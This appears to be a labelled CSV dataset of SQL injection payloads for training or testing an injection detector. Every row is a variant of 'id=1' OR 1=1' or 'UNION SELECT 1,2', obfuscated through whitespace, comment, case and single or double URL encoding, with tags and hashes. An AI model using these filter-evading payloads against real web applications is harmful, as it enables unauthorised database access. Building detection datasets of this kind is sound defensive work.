id%253D1%2527%2509OR%25091%253D1--,1,sqli_whitespace_var,case_var|comment_dash_dash,double_encoded,SQLI_WHITESPACE_VAR_004,8dd03652e955443b0f390414a4102796,ecdf445e72f693c7b9a5f67e33706534,34
id=1'%20OR%201=1,1,sqli_whitespace_var,case_var|ws_plus,raw,SQLI_WHITESPACE_VAR_003,478fd90f78e8c8d339eb653a52f79b0d,29fe8e345c31ebda5bf7826e1a38fa7b,16
id%3D1%27%20OR%201%3D1%23,1,sqli_whitespace_var,case_var|comment_hash|ws_multi_space,partially_encoded,SQLI_WHITESPACE_VAR_003,71b52894e2ba3968e1033f48856775b9,695338dfe8b72944f3a2893037267206,25
id%3D1%27++Or+++1%3D1,1,sqli_whitespace_var,case_var,url_encoded,SQLI_WHITESPACE_VAR_001,f54abf44355372be9904c4f26658a757,4e259a00c1241b1b8890d50a3c703f1c,21
id%253D1%2527%2509%2509OR%2509%2509%25091%253D1,1,sqli_whitespace_var,ws_tab,double_encoded,SQLI_WHITESPACE_VAR_001,8a7eae0eb1aa135ac456d29548b4a215,21196a80d21ccc73fa0572d9a75f0634,47
id%253D1%2527%2B%2BOR%2B%2B%2B1%253D1%2523,1,sqli_whitespace_var,case_var|comment_hash,double_encoded,SQLI_WHITESPACE_VAR_001,119fef7e31c02122aa0a6837702481d7,dbfa524fd43f2fd5582732a6ab44a86e,42
id%3D1%27%2520OR%25201%3D1%2523,1,sqli_whitespace_var,case_var|comment_url_hash,url_encoded,SQLI_WHITESPACE_VAR_003,70213c3300abe0d0aa6094f1fbae2994,11f5368ed2b2c7703d970cbd429a0454,31
id=1'+OR+1=1/*,1,sqli_whitespace_var,case_var|comment_block_comment,raw,SQLI_WHITESPACE_VAR_002,931bb4ed826b16853ee81e341606b53b,1fee01526f7545ebf399a9fcd95f8666,14
id%3D1%27%2F%2A%2A%2FOR%2F%2A%2A%2F1%3D1,1,sqli_whitespace_var,standard,url_encoded,SQLI_WHITESPACE_VAR_005,7efd28f831e6aa135a85caf1eab2585c,920a22ef3f312cee40f2394a45b3e55f,40
id%3D1%27%2F%2A%2A%2FOR%2F%2A%2A%2F1%3D1%3B--%2520-,1,sqli_whitespace_var,case_var|comment_semicolon_comment|ws_url_space,url_encoded,SQLI_WHITESPACE_VAR_005,89368736b3379ec77e2a4974456009e0,38d95fa0f475e6cde3890bdf01042d89,51
id%3D1%27%2520OR%25201%3D1%2F%2A,1,sqli_whitespace_var,case_var|comment_block_comment,url_encoded,SQLI_WHITESPACE_VAR_003,71007de5d6d16bddfad262e415717ee4,83797bbd0f5248aff5f2a9163da4aae5,32
id%253D1%2527%252520%252520OR%252520%252520%2525201%253D1--,1,sqli_whitespace_var,comment_dash_dash|ws_url_space,double_encoded,SQLI_WHITESPACE_VAR_001,25d268ada80a0f3e3b1ad509e6c9ca01,01451ab0d22b383f03387df7c2fe4642,59
id%253D1%2527%252F%252A%252A%252FOR%252F%252A%252A%252F1%253D1%252523,1,sqli_whitespace_var,case_var|comment_url_hash,double_encoded,SQLI_WHITESPACE_VAR_005,ab626cfae29dd582cf1f20664b86531d,1cec7d2fb3c9b79a9e08dfa50d4848b9,69
id=1'/**/OR/**/1=1,1,sqli_whitespace_var,case_var|ws_tab,raw,SQLI_WHITESPACE_VAR_005,1503d8305608e645f35a42fe3c4b3d7a,011fd819cbcb7d2d56a4a30695ff59f0,18
id%253D1%2527%252BOR%252B1%253D1,1,sqli_whitespace_var,case_var,double_encoded,SQLI_WHITESPACE_VAR_002,16359beb5c49e6322a79e7dfdb89875b,310fb6a362d80890d5582314a983cd35,32
id%3D1%27  Or+ +1=1--,1,sqli_whitespace_var,case_var|comment_dash_dash,partially_encoded,SQLI_WHITESPACE_VAR_001,e7ae1eb8e33d8ba4362dea4ac2027fd0,eeb02fd3ef59eb4b7911a3833d94f936,21
id=1'%20%20or%20%20%201=1,1,sqli_whitespace_var,case_var|ws_url_space,raw,SQLI_WHITESPACE_VAR_001,8be5460180e13ed4f3fe9a25073410b9,8be5460180e13ed4f3fe9a25073410b9,25
id%253D1%2527%2509OR%25091%253D1,1,sqli_whitespace_var,ws_multi_space,double_encoded,SQLI_WHITESPACE_VAR_004,c6dd44b2e8b47708245d67c2cb5c7f61,b71110b945d35fd032371bba7258f40c,32
id=1'	OR	1=1%23,1,sqli_whitespace_var,case_var|comment_url_hash|ws_multi_space,raw,SQLI_WHITESPACE_VAR_004,6a42d4a041a75cc2360475a039903263,ea20fee043f26e150ac9bebe0a4c9e6a,15
id%253D1%2527%252F%252A%252A%252FOR%252F%252A%252A%252F1%253D1--,1,sqli_whitespace_var,case_var|comment_dash_dash|ws_plus,double_encoded,SQLI_WHITESPACE_VAR_005,5bbef9449b9fbce1e39f200c7e2f4d24,e37b056a7799254db2b169e51f979798,64
id%3D1'/%2A%2A%2FOR%2F%2A%2A%2F1%3D1,1,sqli_whitespace_var,case_var|ws_comment_ws,partially_encoded,SQLI_WHITESPACE_VAR_005,20feb63cd58a8c779341ddfa56ccefdf,222a242ff05a282f37efa7c6d159edbe,36
id=1'+OR+1=1,1,sqli_whitespace_var,case_var,partially_encoded,SQLI_WHITESPACE_VAR_002,70b4c0f0dd1e1a860d68d0a880ee7830,b900171106e07bab2016414fb10dbee0,12
id%253D1%2527%2B%2BOr%2B%2B%2B1%253D1,1,sqli_whitespace_var,case_var,double_encoded,SQLI_WHITESPACE_VAR_001,1faa24202adce1dacc5bb29670e3095d,dc0a92120e0ad0e41039a7fb4f929ec7,37
id%3D1%27%2BOR%2B1%3D1,1,sqli_whitespace_var,case_var,url_encoded,SQLI_WHITESPACE_VAR_002,50ef1e33a840931a204b85fe7a948f50,c6ba95c8bbabf9b06ddb94901203f67d,22
id%3D1%27%2F%2A*/OR%2F%2A*%2F1=1,1,sqli_whitespace_var,standard,partially_encoded,SQLI_WHITESPACE_VAR_005,f185f8502c2e518d182160270ea7899a,cd6e3dd93cb4e3d4df8f3306ffe1210d,32
id%3D1%27/%2A*/OR/*%2A/1=1,1,sqli_whitespace_var,case_var|ws_url_space,partially_encoded,SQLI_WHITESPACE_VAR_005,8a3dfd9fb692a29d3baddb7f4d574760,4023d3dfce4094c961632bf05d556079,26
id%253D1%2527%2509OR%25091%253D1%2523,1,sqli_whitespace_var,case_var|comment_hash|ws_url_space,double_encoded,SQLI_WHITESPACE_VAR_004,265143a014823627986631f7aa6778e8,a2b7573f4c114b723bc871ea226d4e9c,37
id%253D1%2527%252520%252520OR%252520%252520%2525201%253D1--%252520-,1,sqli_whitespace_var,case_var|comment_dash_dash_space|ws_url_space,double_encoded,SQLI_WHITESPACE_VAR_001,3da30db4a215547d1a7e1f25cbdc3552,df82c612d6c336c666021d30a3dcb5ba,67
id=1'%2F*%2A/OR%2F%2A%2A%2F1%3D1,1,sqli_whitespace_var,ws_mixed_ws,partially_encoded,SQLI_WHITESPACE_VAR_005,4715ed6dacac4d8b1cc53130004cc476,2a7b0bfcaf6cfd6c20c6c192c8a28239,32
id%3D1%27++++OR++++++1%3D1,1,sqli_whitespace_var,ws_multi_space,url_encoded,SQLI_WHITESPACE_VAR_001,0c8032fb6946fbbd893fcbb6837018b2,c36ba6a4f347b3d992b5007011fc1dff,26
id%253D1%2527%252520OR%2525201%253D1--%2509-,1,sqli_whitespace_var,comment_dash_dash_space|ws_tab,double_encoded,SQLI_WHITESPACE_VAR_003,e3edb6bae2e939ebec4cfb62cd54c9d4,65b8914734dd7c8962712c6e97155bec,44
id=1'%20OR%201=1-- -,1,sqli_whitespace_var,case_var|comment_dash_dash_space|ws_space,raw,SQLI_WHITESPACE_VAR_003,5f365b570edcfa127c83c0bdacdc6dc3,894914ae782a675a4ce066c7cf9407f4,20
id=1'+OR+1=1%23,1,sqli_whitespace_var,comment_url_hash,raw,SQLI_WHITESPACE_VAR_002,39c2ccb81e42b6d63af5a6ad54ae58a8,ade43d55e0df9d089be4b996c0eda042,15
id=1%27%20OR%201=1--%20-,1,sqli_whitespace_var,case_var|comment_dash_dash_space|ws_url_space,partially_encoded,SQLI_WHITESPACE_VAR_003,6219340b6b428dd7c8967260225158df,1e86366923d0e60e266326653b621bc6,24
id%253D1%2527%252520OR%2525201%253D1,1,sqli_whitespace_var,ws_mixed_ws,double_encoded,SQLI_WHITESPACE_VAR_003,d8a7bc693dabf04e12c8ffc8bc7fab29,f498b7222e8dc3e080cf845b3fa42179,36
id=1'+OR+1=1;--  -,1,sqli_whitespace_var,comment_semicolon_comment|ws_multi_space,raw,SQLI_WHITESPACE_VAR_002,8fe167c15b4643de1775b33b2ff2263d,4167db9e694939cda786bae94cb87917,18
id%3D1%27%09OR%091%3D1--+-,1,sqli_whitespace_var,comment_dash_dash_space|ws_space,url_encoded,SQLI_WHITESPACE_VAR_004,a981fed3036ca58419d6fffd52fbb883,1b0d122714b58503513fef48cdcdf577,26
id=1%27++  OR + ++ 1%3D1%23,1,sqli_whitespace_var,comment_url_hash|ws_multi_space,partially_encoded,SQLI_WHITESPACE_VAR_001,fe3a592cd56dcd18a74683037008f1ec,af34da5c9177071978f5d3bd4bcb798f,27
id=1'/**//**/OR/**//**//**/1=1,1,sqli_whitespace_var,ws_comment_ws,raw,SQLI_WHITESPACE_VAR_001,51d3cc0087053a40f3538993df134651,9fe834d31faac5cd982095772dcebe10,30
id%3D1%27%2520OR%25201%3D1--,1,sqli_whitespace_var,comment_dash_dash|ws_comment_ws,url_encoded,SQLI_WHITESPACE_VAR_003,5c0802d07805bf122e4a8fcb72ae8d04,fb64be5a8501fef4cdacae87816b082d,28
id%253D1%2527%252BOR%252B1%253D1%2523,1,sqli_whitespace_var,case_var|comment_hash|ws_plus,double_encoded,SQLI_WHITESPACE_VAR_002,b2d3bdf33be2dd08d852e6be7b8b4333,5951453d5d83d6c76234b6ad60956ed7,37
id%3D1%27%2F%2A%2A%2FOR%2F%2A%2A%2F1%3D1--,1,sqli_whitespace_var,comment_dash_dash,url_encoded,SQLI_WHITESPACE_VAR_005,a66dd785daa1d577d561e9cb3ffbb14b,5513c3e186fa665c85da062f71c74c6d,42
id%3D1%27++OR+++1%3D1--,1,sqli_whitespace_var,comment_dash_dash,url_encoded,SQLI_WHITESPACE_VAR_001,8bafc23b398b3faf102c7a5f4ad942c9,7ab4f5181b72cd83e136811f0890b8d5,23
id=1'+OR+1=1-- -,1,sqli_whitespace_var,case_var|comment_dash_dash_space,raw,SQLI_WHITESPACE_VAR_002,1934340fa018014ea46a9cd8c486929f,869df1e909628eb3b57601b1efcdb60b,16
id%253D1%2527%252F%252A%252A%252FOR%252F%252A%252A%252F1%253D1--%2B-,1,sqli_whitespace_var,comment_dash_dash_space,double_encoded,SQLI_WHITESPACE_VAR_005,b0d1b75d5995b122ef5a994dc966f57b,6022dd75a96d09f1c0c811caea11b462,68
id%3D1%27 +OR+ +1%3D1,1,sqli_whitespace_var,standard,partially_encoded,SQLI_WHITESPACE_VAR_001,7ce781c81f694884442c567d51680ca4,3e7f3d85ed5af57b6cfaf9a3f63c2b4b,21
id%3D1%27%2BOR%2B1%3D1--,1,sqli_whitespace_var,comment_dash_dash,url_encoded,SQLI_WHITESPACE_VAR_002,4da8e5a4e2982eee8c569db834e8b604,4795a1154313e0ea4626e605cbb1c110,24
id%3D1%27%09OR%091%3D1--,1,sqli_whitespace_var,comment_dash_dash,url_encoded,SQLI_WHITESPACE_VAR_004,1fbd55e12ddc24b8892658c81fd59145,08f422159da3d3437d5635adb5b5ef2a,24
id%253D1%2527%252F%252A%252A%252FOR%252F%252A%252A%252F1%253D1,1,sqli_whitespace_var,ws_mixed_ws,double_encoded,SQLI_WHITESPACE_VAR_005,0f3a4cc5f80f6ef07049b77954eb85ef,cbe8b3f91c25edf2eee9333e2d09d2a5,62
id%3D1%27%09OR%091%3D1,1,sqli_whitespace_var,case_var,url_encoded,SQLI_WHITESPACE_VAR_004,b2dc848359b4275996909c137db77a87,6741132ff7e76dc006b2414a0a0e3ff1,22
id=1'/**//**/OR/**//**//**/1=1--,1,sqli_whitespace_var,case_var|comment_dash_dash|ws_comment_ws,raw,SQLI_WHITESPACE_VAR_001,7f93306190ba53d66fd8ffca43b2c82b,e4ea26ef45831187c63b0173e53d9cb7,32
id%3D1%27%2F**/%2F*%2A/OR/%2A%2A%2F%2F%2A%2A%2F%2F*%2A/1=1,1,sqli_whitespace_var,ws_comment_ws,partially_encoded,SQLI_WHITESPACE_VAR_001,0d9b0e74eace9e9f92e1ac211e7e9660,7cb0cad07b03adfad52bbd2de92904b3,58
id%3D1'%2F%2A%2A/OR%2F%2A*%2F1=1,1,sqli_whitespace_var,standard,partially_encoded,SQLI_WHITESPACE_VAR_005,93f2aab5876b50ede031cf18f1fa02bd,ee266383560e00c722b36906bb5af63d,32
id%3D1%27%2520%2520OR%2520%2520%25201%3D1,1,sqli_whitespace_var,case_var|ws_url_space,url_encoded,SQLI_WHITESPACE_VAR_001,e47e9b44d5b9cde8823b40104da30587,91bb3e5e5d80842a661ed62127adb9b6,41
id=1'+OR+1=1--,1,sqli_whitespace_var,case_var|comment_dash_dash|ws_mixed_ws,raw,SQLI_WHITESPACE_VAR_002,2e0fc5bf4a47010352cf8adcb6ae34b2,77acd121b5f41ad65affae711a699a68,14
id=1'/%2A%2A/OR/%2A*/1%3D1,1,sqli_whitespace_var,case_var,partially_encoded,SQLI_WHITESPACE_VAR_005,e4ad48dc758a9230016a83f069465a0a,a04b89d172a11e3cb1a4a8245a481b76,26
id%3D1%27%2F%2A*/OR/%2A%2A%2F1%3D1,1,sqli_whitespace_var,ws_space,partially_encoded,SQLI_WHITESPACE_VAR_005,488b7673ec72a2b407786c1d60aab336,947c650b2321961cd8859568123eae17,34
id=1'	OR	1=1;--  -,1,sqli_whitespace_var,comment_semicolon_comment|ws_multi_space,raw,SQLI_WHITESPACE_VAR_004,5288d1816d46f9b27c0c153bf54f8105,5457a11cc7f63ce7dad6b45315bbbe02,18
id%3D1%27	OR	1%3D1,1,sqli_whitespace_var,case_var|ws_plus,partially_encoded,SQLI_WHITESPACE_VAR_004,6e9e06e98b8f8479f1c052cca077b117,f025ce365ed77197b94761431b383da9,18
id%253D1%2527%2509OR%25091%253D1--%252B-,1,sqli_whitespace_var,case_var|comment_dash_dash_space|ws_plus,double_encoded,SQLI_WHITESPACE_VAR_004,179c7cb30894a6f6d4ed136bad6ba541,046f7985f22f8d30e882fcb83eb8ec5b,40
id=1'++OR+++1=1#,1,sqli_whitespace_var,case_var|comment_hash|ws_plus,raw,SQLI_WHITESPACE_VAR_001,30c8ca8da8f04c1232bd32aa8ba7a52b,4aeb1ec039a72195fbc984088780126d,16
id%3D1%27%09OR%091%3D1%2523,1,sqli_whitespace_var,comment_url_hash,url_encoded,SQLI_WHITESPACE_VAR_004,0e8535890236a8b7bf6f42c38e8b65a6,1a59f1ec9299b9018ce41aefdf85cf92,27
id%3D1'%2F**%2F/%2A%2A%2FOR%2F*%2A/%2F%2A*%2F/*%2A/1%3D1,1,sqli_whitespace_var,case_var|ws_comment_ws,partially_encoded,SQLI_WHITESPACE_VAR_001,c425b211e2eade78d9e413abe0cbbddc,6a3f226e2d8f35e889f5280dc9ac6111,56
id%3D1%27%2F%2A%2A%2FOR%2F%2A%2A%2F1%3D1%3B--%2B-,1,sqli_whitespace_var,comment_semicolon_comment|ws_plus,url_encoded,SQLI_WHITESPACE_VAR_005,47e595544930b3163c5f74c8b0d12015,0b1be7a365e64a49ff50b6c050d85b7b,49
id%3D1%27%2F%2A%2A%2FOR%2F%2A%2A%2F1%3D1--+-,1,sqli_whitespace_var,case_var|comment_dash_dash_space,url_encoded,SQLI_WHITESPACE_VAR_005,cdd6582f8102a8ea74bcd4231b72d759,2cc4ae9965f0ef7f59ab977cdac6fd3b,44
id%253D1%2527%252520OR%2525201%253D1%252F%252A,1,sqli_whitespace_var,comment_block_comment|ws_comment_ws,double_encoded,SQLI_WHITESPACE_VAR_003,a65b8da0e22f221b0a91d48291f0fa1f,ad7a2ffc34e03a98352617869de2d7d1,46
id=1'/%2A*/OR%2F%2A%2A%2F1%3D1/*,1,sqli_whitespace_var,comment_block_comment|ws_tab,partially_encoded,SQLI_WHITESPACE_VAR_005,2e33c4b2cca8e7a7a08cdce7ee1f09c8,12267580d1535c94b53605fe6b1a9bb0,32
id=1'++OR+++1=1%23,1,sqli_whitespace_var,case_var|comment_url_hash|ws_plus,raw,SQLI_WHITESPACE_VAR_001,2a1ed5bf93affeae11c1a62947ccb92e,905fa1d66cf6f2075c90798e6b66dd62,18
id=1'	OR	1=1%3B--+-,1,sqli_whitespace_var,comment_semicolon_comment|ws_plus,partially_encoded,SQLI_WHITESPACE_VAR_004,ca4969d1db72b1837a3b380ea4b27d4a,5f668b0a9c31fb901bc1b4d29c4624ed,19
id=1%27  OR + 1%3D1,1,sqli_whitespace_var,case_var,partially_encoded,SQLI_WHITESPACE_VAR_001,278bf04e80c41c1d0ff822328a644851,fbab6a2bcac6c244378eb9ef1113fd6d,19
id=1'%20OR%201%3D1,1,sqli_whitespace_var,case_var|ws_comment_ws,partially_encoded,SQLI_WHITESPACE_VAR_003,0de8fc4b37601ed93bf17fda8cb05fd2,9087a515347d392728d10135f227f20d,18
id%3D1%27/%2A%2A%2FOR%2F%2A*%2F1%3D1%2F%2A,1,sqli_whitespace_var,case_var|comment_block_comment,partially_encoded,SQLI_WHITESPACE_VAR_005,da6ff56904e0c6155fbb7f08ae6ef22c,612262b4ccc416a5bb313393439b8f55,42
id%3D1%27/%2A%2A%2FOR%2F%2A*%2F1=1,1,sqli_whitespace_var,case_var,partially_encoded,SQLI_WHITESPACE_VAR_005,c3ad6d69f82001a3333f4650886d399c,bf45897298cb5e4dccaafb721da1f607,34
id%253D1%2527%2509OR%25091%253D1%252F%252A,1,sqli_whitespace_var,comment_block_comment,double_encoded,SQLI_WHITESPACE_VAR_004,7b4d31892d3c1b7ec2364ba5ee8b5f9c,483f71bbfd6481f96fd845f988e2e14d,42
id%253D1%2527%252BOR%252B1%253D1%253B--%2B-,1,sqli_whitespace_var,case_var|comment_semicolon_comment,double_encoded,SQLI_WHITESPACE_VAR_002,526645b7381d26aa1807eff291d385e7,371e67253e2c2b214e19d108565d247b,43
id%3D1%27%09OR%091%3D1%2F%2A,1,sqli_whitespace_var,case_var|comment_block_comment|ws_space,url_encoded,SQLI_WHITESPACE_VAR_004,6f962eda712bda577b6395ca69b79f16,221a3a4e285e0771e735b53aae14173a,28
id%3D1'%2F%2A%2A%2FOR%2F**%2F1%3D1%2F*,1,sqli_whitespace_var,case_var|comment_block_comment|ws_mixed_ws,partially_encoded,SQLI_WHITESPACE_VAR_005,6abfc02798ec33ee72242d82a93e1f44,c2181375978e2f1bf4241c75086251ca,38
id%253D1%2527%252BOR%252B1%253D1%252F%252A,1,sqli_whitespace_var,case_var|comment_block_comment|ws_tab,double_encoded,SQLI_WHITESPACE_VAR_002,8547c313623738babf1a9974dbbe2e9a,41f9c2dfd8cad1aff2d89b25ff63309e,42
id%3D1'%2F%2A*/OR%2F%2A*/1%3D1#,1,sqli_whitespace_var,case_var|comment_hash,partially_encoded,SQLI_WHITESPACE_VAR_005,2246b5a9f87b674c5e753183e5f32056,97d5c2477aab5d3784833c6e7ee95441,31
id%253D1%2527%252BOR%252B1%253D1%253B--%252B-,1,sqli_whitespace_var,comment_semicolon_comment|ws_plus,double_encoded,SQLI_WHITESPACE_VAR_002,1aabaf1101feb9b568f46ed358753412,ceb663c4de619fee0e8955aedf4f18ac,45
id%3D1'%20OR%201%3D1,1,sqli_whitespace_var,standard,partially_encoded,SQLI_WHITESPACE_VAR_003,7ac919530ad29a93a87eba4d27c2e6c2,3685669738d8200e5237195faf870c29,20
id=1%27%2F**/OR/%2A%2A/1%3D1--,1,sqli_whitespace_var,comment_dash_dash,partially_encoded,SQLI_WHITESPACE_VAR_005,c6653e036394a5ab2f3f97e022bad26c,8914845293964954ef7b8226f897a31d,30
id%253D1%2527%252520OR%2525201%253D1--%2B%2B-,1,sqli_whitespace_var,case_var|comment_dash_dash_space|ws_multi_space,double_encoded,SQLI_WHITESPACE_VAR_003,79f676709f7bf37f7fec1e344d182379,8b1de6c9a038ce0b3270aaf87e8ccf1c,45
id%3D1%27+OR+1=1%23,1,sqli_whitespace_var,case_var|comment_url_hash,partially_encoded,SQLI_WHITESPACE_VAR_002,53981fca90d7254117e1a221e8f0f670,bb3ebd8a96820f95245c65056e657884,19
id=1%27%20%20OR%20%20%201=1%2F%2A,1,sqli_whitespace_var,comment_block_comment|ws_url_space,partially_encoded,SQLI_WHITESPACE_VAR_001,b63c0a95425bfc25bb3ae41fe1fdd43b,56cc5d7e19954d0c9d787904e145ef44,33
id%253D1%2527%252520OR%2525201%253D1%253B--%2509-,1,sqli_whitespace_var,case_var|comment_semicolon_comment|ws_tab,double_encoded,SQLI_WHITESPACE_VAR_003,4f2b40b5e36bce1dba10a2e4f0f0639d,3452de515778374470bdbd39699758aa,49
id%3D1%27++OR+++1%3D1--+-,1,sqli_whitespace_var,comment_dash_dash_space,url_encoded,SQLI_WHITESPACE_VAR_001,7cea0740cec547af2113d4c62efcefea,1beac619e6ff7d5ea8c75ab6ff38703d,25
id%253D1%2527%2B%2BOR%2B%2B%2B1%253D1%252F%252A,1,sqli_whitespace_var,case_var|comment_block_comment,double_encoded,SQLI_WHITESPACE_VAR_001,d1c619a22eff7b219b8237c5b64ae629,502997d9cc37cc021bf9c1800a8700c5,47
id%253D1%2527%252BOR%252B1%253D1%252523,1,sqli_whitespace_var,case_var|comment_url_hash|ws_comment_ws,double_encoded,SQLI_WHITESPACE_VAR_002,e28c4703a99ca5a429abe30327400683,28ed3f6bd79f4943950d7e8958848182,39
id%253D1%2527%252520OR%2525201%253D1%253B--%2B-,1,sqli_whitespace_var,case_var|comment_semicolon_comment,double_encoded,SQLI_WHITESPACE_VAR_003,514020f42fdd2b4bb3b7b68e8e487973,f8a53b48d2d1fef1cc0c21ad9847849b,47
id%3D1%27%20OR%201=1#,1,sqli_whitespace_var,comment_hash|ws_comment_ws,partially_encoded,SQLI_WHITESPACE_VAR_003,4ad4ce62e2689ccb7eef31e4985210e7,f4ee7317116a6ee079b8279e4e762437,21
id%3D1'+OR+1=1--,1,sqli_whitespace_var,case_var|comment_dash_dash|ws_multi_space,partially_encoded,SQLI_WHITESPACE_VAR_002,7393273afd4a05b3411ae45dd0298813,b71855908b9c4d2f5f60417037ae7b5f,16
id=1%27%20OR%201=1--+-,1,sqli_whitespace_var,case_var|comment_dash_dash_space,partially_encoded,SQLI_WHITESPACE_VAR_003,b9dc8326c308cfcd871bd375c24a9e13,8c19887e90e40fdc127a39d3752cd49e,22
id%3D1%27+oR+1%3D1+%23,1,sqli_case_var,comment_hash,url_encoded,SQLI_CASE_VAR_001,f7d3c37f1e530bfeb49743bfed8bd868,f973e111dc3fb56394a991e0cb1e938f,22
id=1'+aNd+1=1+%23,1,sqli_case_var,comment_url_hash,partially_encoded,SQLI_CASE_VAR_004,3a783fb2e8b5975e2e5ceb5be34f66f3,2357817b0f41eaa0966abf37106710b2,17
"id=1' union select 1,2 -- -",1,sqli_case_var,case_var|comment_dash_dash_space,raw,SQLI_CASE_VAR_003,4f36290db10e601534b8beff4fca40e4,20dbfa9dbc28e21e57a8f4f81947c5bd,27
id%253D1%2527%252520anD%2525201%253D1%252520--,1,sqli_case_var,case_var|comment_dash_dash|ws_url_space,double_encoded,SQLI_CASE_VAR_004,d50c64f5818d6131600f7fc34dc47a42,20e24175161b499f2b5e30b81b4e8376,46
id=1' aNd 1=1 %23,1,sqli_case_var,comment_url_hash,raw,SQLI_CASE_VAR_004,86faddd763c0a33d0bbae4b89fb73423,2a3d9f5cc51e97db094aff7281596a1d,17
id%3D1%27+SeLeCt+1%2C2+--+-,1,sqli_case_var,comment_dash_dash_space,url_encoded,SQLI_CASE_VAR_002,1411ef932d193aef1c3128c39c6b7284,53a53869f142f6046fc69ea49301f08c,27
id=1%27+ aNd +1%3D1++/%2A,1,sqli_case_var,comment_block_comment|ws_multi_space,partially_encoded,SQLI_CASE_VAR_004,9aa1afe2e8c4cce7f2e56d87aade4e1c,369a878132cb498874441b2fb2b2afaa,25
id%3D1%27%2520UnIoN%2520sElEcT%25201%2C2%2520--%2520-,1,sqli_case_var,comment_dash_dash_space|ws_url_space,url_encoded,SQLI_CASE_VAR_003,549ee4b1bd18c189d93a12e75511be03,1309d3c80f17f1e91cf27f476a8fb826,53
id%253D1%2527%252BSelect%252B1%252C2%252B%2523,1,sqli_case_var,case_var|comment_hash|ws_plus,double_encoded,SQLI_CASE_VAR_002,3fd80b4a2325890ee7f8abb5a13fecf8,9398561783beb900a1a6ff8b5d2ffdea,46
id%3D1%27+or+1%3D1+--,1,sqli_case_var,case_var|comment_dash_dash,url_encoded,SQLI_CASE_VAR_001,15b19ed0e1636c83f25140fa7448a452,0af9ad5cf47897e30530463088919d85,21
id%253D1%2527%252F%252A%252A%252Fand%252F%252A%252A%252F1%253D1%252F%252A%252A%252F%252F%252A,1,sqli_case_var,case_var|comment_block_comment|ws_comment_ws,double_encoded,SQLI_CASE_VAR_004,ba97ba7c2e682cc4ea06608539750eb9,6d066868fcc1c1324090c49b4c054a8b,93
id=1' aNd 1=1 -- -,1,sqli_case_var,comment_dash_dash_space,raw,SQLI_CASE_VAR_004,388b467e336ac39b85938187dc661985,f51629b307ceeafb0d09cdc253d9e146,18
id%3D1%27+OR+1=1+%23,1,sqli_case_var,case_var|comment_url_hash,partially_encoded,SQLI_CASE_VAR_001,63a329c58af0ece35f4dee80dbcb01e9,4101fe7c36bf6c34103e38ea60175953,20
id%3D1%27+AND+1%3D1+--+-,1,sqli_case_var,case_var|comment_dash_dash_space|ws_plus,partially_encoded,SQLI_CASE_VAR_004,dadb5eb4039155408b21e482aa5ddbee,fefb267e98e2e7e522b97a851e660526,24
id=1' And 1=1 ;--+-,1,sqli_case_var,case_var|comment_semicolon_comment,partially_encoded,SQLI_CASE_VAR_004,8ead8d1b7b2849145ca5094361acd530,8695fb5278e7f1b5bc0c7953da332908,19
id%3D1%27%2520AND%25201%3D1%2520%2F%2A,1,sqli_case_var,case_var|comment_block_comment|ws_url_space,url_encoded,SQLI_CASE_VAR_004,f5d7d300b1cc9521ff74e32210abd3b8,72e0d3b3315f6ca93e8d55ac6e63c322,38
id%3D1%27+SeLeCt+1%2C2+%2F%2A,1,sqli_case_var,comment_block_comment,url_encoded,SQLI_CASE_VAR_002,f80bd995f688112f4df3661b716411e9,c4a00f717f314fa5f37fe137cca3c10f,29
"id=1%27+seleCt+1,2 -- -",1,sqli_case_var,case_var|comment_dash_dash_space|ws_space,partially_encoded,SQLI_CASE_VAR_002,9449587ca674d4d9dfdd461e03c4e2d7,febd747f4aa707b747e9b022908ae1a6,23
"id=1' UNION SeLeCT 1,2 #",1,sqli_case_var,case_var|comment_hash,raw,SQLI_CASE_VAR_003,286113bd61816ebf729abd45a1ff80db,eea411dba2471005f51b07bbfa08c7df,24
"id=1%27+Select+1,2+--+-",1,sqli_case_var,case_var|comment_dash_dash_space,partially_encoded,SQLI_CASE_VAR_002,1f0b0276b5c49110dccd8b7e0d7d5904,dd985cb2e035b8268b84f0638c0fadfe,23
"id%3D1' UnIoN sElEcT+1,2 %23",1,sqli_case_var,comment_hash,partially_encoded,SQLI_CASE_VAR_003,71a8518871165e165a43f6d220950af1,5a7ae72b4337cef837351d09d85aeeda,28
id%253D1%2527%252BAnd%252B1%253D1%252B%2523,1,sqli_case_var,case_var|comment_hash|ws_plus,double_encoded,SQLI_CASE_VAR_004,89a1d5640efab108e080adb93147bb95,102e804b5bd93e55e7aa496870e7b286,43
id%253D1%2527%252BSELECT%252B1%252C2%252B%252F%252A,1,sqli_case_var,case_var|comment_block_comment|ws_plus,double_encoded,SQLI_CASE_VAR_002,4a8fb44915bfc0f42d92fd100f797520,b52156eb33a4815e41de43b1eadcef8e,51
id%3D1%27+or+1%3D1+--+-,1,sqli_case_var,case_var|comment_dash_dash_space,url_encoded,SQLI_CASE_VAR_001,6138edbd2d82fe2bbdfa1e4826db9f7f,ee6830e9dab8673264229a07f622a993,23
id=1'	aNd	1=1	/*,1,sqli_case_var,comment_block_comment|ws_tab,raw,SQLI_CASE_VAR_004,10838cf00f95c3740a3e1ba3cd8ccf65,d4a3773aadb81fcf9258814e3dc40bcc,16
"id%3D1%27 +UNION +Select  1,2++/%2A",1,sqli_case_var,case_var|comment_block_comment|ws_multi_space,partially_encoded,SQLI_CASE_VAR_003,e2a91dee8f54f678e5d111dbca454fb6,f5da1606c09841203fbf02bd4f244255,35
id%3D1'+or+1%3D1+%23,1,sqli_case_var,case_var|comment_url_hash|ws_plus,partially_encoded,SQLI_CASE_VAR_001,678a34e51d79de92d654f8092a7527a4,ce666d58d6359ccdf117907e75855be6,20
"id=1' SeLeCt 1,2 /*",1,sqli_case_var,comment_block_comment|ws_space,raw,SQLI_CASE_VAR_002,9ba2b828ea28d5a8796eb98f4bc87441,09b8973037d330d69bc598962d6858b8,19
id%253D1%2527%2BUnIoN%2BsElEcT%2B1%252C2%2B--%2B-,1,sqli_case_var,comment_dash_dash_space,double_encoded,SQLI_CASE_VAR_003,77a69a21111f93852401b8a5cb4d992a,fb8bffc2a423f818a213a3181f12771c,49
id%3D1' +OR++1%3D1++--,1,sqli_case_var,case_var|comment_dash_dash|ws_multi_space,partially_encoded,SQLI_CASE_VAR_001,eb22fabf034e9c72e8ebc9f1a692853b,65c75082c69f7a1a1ae90264dde259b7,22
id=1'+oR+1%3D1+%23,1,sqli_case_var,comment_url_hash|ws_plus,partially_encoded,SQLI_CASE_VAR_001,25b2b03eb16b9e86e04e5b23371926c8,6e769c7f042792ebdfb6291c836eb144,18
